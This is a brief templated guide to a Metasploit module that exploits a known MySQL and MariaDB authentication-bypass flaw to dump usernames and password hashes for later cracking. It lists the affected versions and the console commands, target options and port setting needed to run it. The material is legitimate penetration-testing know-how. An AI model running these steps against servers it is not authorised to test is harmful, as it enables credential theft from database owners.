**The description of current metasploit exploit**
This module exploits a password bypass vulnerability in MySQL in order to extract the usernames and encrypted password hashes from a MySQL server.    These hashes are stored as loot for later cracking.    Impacts MySQL versions:    - 5.1.x before 5.1.63     - 5.5.x before 5.5.24     - 5.6.x before 5.6.6     And MariaDB versions:     - 5.1.x before 5.1.62     - 5.2.x before 5.2.12     - 5.3.x before 5.3.6     - 5.5.x before 5.5.23

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
# Repeat for each required parameter from Step 1
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 3306 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.